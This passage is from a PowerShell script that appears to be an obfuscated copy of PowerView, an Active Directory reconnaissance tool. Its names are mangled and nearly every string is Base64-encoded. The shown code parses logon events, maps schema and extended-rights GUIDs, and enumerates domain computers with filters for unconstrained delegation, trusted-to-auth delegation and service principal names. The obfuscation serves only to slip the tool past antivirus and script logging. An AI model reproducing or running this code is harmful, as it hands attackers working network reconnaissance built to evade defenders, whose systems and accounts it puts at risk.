                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            ${__/\/\/\_/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${__/\/\/\_/\/\/=\/}
                        }
                    }
                    4648 {
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHMAawBoAG8AcwB0AFwALgBlAHgAZQA='))))) {
                            ${__/\/\/\_/\/\/=\/} = New-Object PSObject -Property @{
                                ComputerName              = ${__/\__/\/\_/=====}
                                TimeCreated       = ${/\________/=====\}.TimeCreated
                                EventId           = ${/\________/=====\}.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            ${__/\/\/\_/\/\/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBFAHgAcABsAGkAYwBpAHQAQwByAGUAZABlAG4AdABpAGEAbABMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            ${__/\/\/\_/\/\/=\/}
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $(${/\________/=====\}.Id)"
                    }
                }
            }
        }
    }
}
function _/==\/\/\/\/\/===\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/=\_/=\__/\_/\/=} = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    ${_/=\_/\/\/\/==\_/} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=\_/\/\/\/==\_/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    try {
        ${/=\/\___/\/==\_/=} = (_/=\/\/\____/==\/= @_/=\_/\/\/\/==\_/).schema.name
    }
    catch {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    if (-not ${/=\/\___/\/==\_/=}) {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    ${/=\___/=\__/=\/\/} = @{
        'SearchBase' = ${/=\/\___/\/==\_/=}
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${_/=\/\/\__/\/\___} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    if (${_/=\/\/\__/\/\___}) {
        try {
            ${/==\_/=\____/===\} = ${_/=\/\/\__/\/\___}.FindAll()
            ${/==\_/=\____/===\} | ? {$_} | % {
                ${_/=\_/=\__/\_/\/=}[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${_/=\/\/\__/\/\___}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = ${/=\/\___/\/==\_/=}.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA'))))
    ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
    ${/==\_/\_/\_____/=} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    if (${/==\_/\_/\_____/=}) {
        try {
            ${/==\_/=\____/===\} = ${/==\_/\_/\_____/=}.FindAll()
            ${/==\_/=\____/===\} | ? {$_} | % {
                ${_/=\_/=\__/\_/\/=}[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${/==\_/\_/\_____/=}.dispose()
        }
        catch {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAGIAdQBpAGwAZABpAG4AZwAgAEcAVQBJAEQAIABtAGEAcAA6ACAAJABfAA==')))
        }
    }
    ${_/=\_/=\__/\_/\/=}
}
function _/==\/\/\_______/\ {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,
        [Switch]
        ${_/\_____/====\/===},
        [Switch]
        ${__/==\_/\/===\_/\/},
        [Switch]
        ${___/\/=\__/\_/\/=\},
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        ${_/===\/=\_/\_/\/==},
        [ValidateNotNullOrEmpty()]
        [String]
        ${_/=\_____/===\/\/=},
        [ValidateNotNullOrEmpty()]
        [String]
        ${___/\/\/\__/==\/=\},
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [Switch]
        ${_____/==\_/\/\_/==},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        ${__/==\__/===\/=\/} = [Enum]::GetNames(${/==\_/\/\___/\___})
        ${__/==\__/===\/=\/} = ${__/==\__/===\/=\/} | % {$_; $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAkAF8A')))}
        _/=\/==\/\_/\__/== -Name UACFilter -ValidateSet ${__/==\__/===\/=\/} -_/=\/\/\_/\/\/\__/ ([array])
    }
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/=\___/==\/====} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            _/=\/==\/\_/\__/== -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${__/=\___/==\/====}) {
            ${_____/\_/\/=\/=\_} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQApAA==')))
                }
                elseif (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AC8APQA9AD0APQBcAC8APQA9AFwAXwAvAD0APQA9AD0APQB9ACcAIABmAHIAbwBtACAAJwAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AJwA=')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                        ${__/=\___/==\/====} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        if (-not ${__/=\___/==\/====}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwA=')))
                        }
                    }
                }
                elseif (${___/=\_/\/\__/===}.Contains('.')) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAbgBhAG0AZQA9ACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQApACgAZABuAHMAaABvAHMAdABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKQA=')))
                }
                elseif (${___/=\_/\/\__/===} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/==\/\_/==\_/\/=} = (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                }
                else {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkA')))
                }
            }
            if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABoAGEAdAAgAGEAcgBlACAAdAByAHUAcwB0AGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAZgBvAHIAIABvAHQAaABlAHIAIABwAHIAaQBuAGMAaQBwAGEAbABzAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAA==')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAFMAUABOADoAIAAkAHsAXwAvAD0APQA9AFwALwA9AFwAXwAvAFwAXwAvAFwALwA9AD0AfQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAkAHsAXwAvAD0APQA9AFwALwA9AFwAXwAvAFwAXwAvAFwALwA9AD0AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAG8AcABlAHIAYQB0AGkAbgBnACAAcwB5AHMAdABlAG0AOgAgACQAewBfAC8APQBcAF8AXwBfAF8AXwAvAD0APQA9AFwALwBcAC8APQB9AA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQA9ACQAewBfAC8APQBcAF8AXwBfAF8AXwAvAD0APQA9AFwALwBcAC8APQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAZQByAHYAaQBjAGUAIABwAGEAYwBrADoAIAAkAHsAXwBfAF8ALwBcAC8AXAAvAFwAXwBfAC8APQA9AFwALwA9AFwAfQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQBzAGUAcgB2AGkAYwBlAHAAYQBjAGsAPQAkAHsAXwBfAF8ALwBcAC8AXAAvAFwAXwBfAC8APQA9AFwALwA9AFwAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAHMAaQB0AGUAIABuAGEAbQBlADoAIAAkAFMAaQB0AGUATgBhAG0AZQA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGUAcgByAGUAZgBlAHIAZQBuAGMAZQBiAGwAPQAkAFMAaQB0AGUATgBhAG0AZQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
